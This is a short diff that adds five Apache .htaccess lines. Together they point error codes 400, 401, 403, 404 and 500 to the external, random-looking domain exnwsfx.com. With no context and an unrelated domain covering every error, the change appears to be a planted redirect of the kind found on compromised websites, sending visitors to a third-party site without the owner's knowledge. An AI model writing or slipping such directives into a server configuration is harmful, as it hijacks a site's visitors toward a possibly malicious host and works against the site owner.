@@ -1,0 +1,5 @@
+ErrorDocument 400 http://exnwsfx.com
+ErrorDocument 401 http://exnwsfx.com
+ErrorDocument 403 http://exnwsfx.com
+ErrorDocument 404 http://exnwsfx.com
+ErrorDocument 500 http://exnwsfx.com
